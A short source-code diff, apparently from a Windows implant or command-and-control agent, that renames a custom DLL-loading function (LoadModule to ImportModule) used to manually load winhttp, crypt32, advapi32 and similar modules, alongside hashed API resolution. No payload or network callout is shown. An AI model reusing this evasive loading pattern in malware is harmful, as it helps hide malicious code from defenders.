@@ -167,13 +167,13 @@ namespace Main {
 		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
 		x_assertb(ctx->modules.shlwapi	= (HMODULE) M_PTR(SHLWAPI));
 
-    	// TODO: Memory leak for heap-allocated EXECUTABLE*
-        x_assertb(ctx->modules.crypt32  = (HMODULE) LoadModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.winhttp  = (HMODULE) LoadModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.advapi   = (HMODULE) LoadModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.iphlpapi = (HMODULE) LoadModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.mscoree  = (HMODULE) LoadModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.kernbase  = (HMODULE) LoadModule(LoadLocalFile, KERNBASE, nullptr, 0, nullptr)->base);
+    	// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase
+        x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.winhttp  = (HMODULE) ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.advapi   = (HMODULE) ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.kernbase  = (HMODULE) ImportModule(LoadLocalFile, KERNBASE, nullptr, 0, nullptr)->base);
 
 #pragma region ioapi
 		x_assertb(F_PTR_HMOD(ctx->ioapi.FileTimeToSystemTime, 						ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
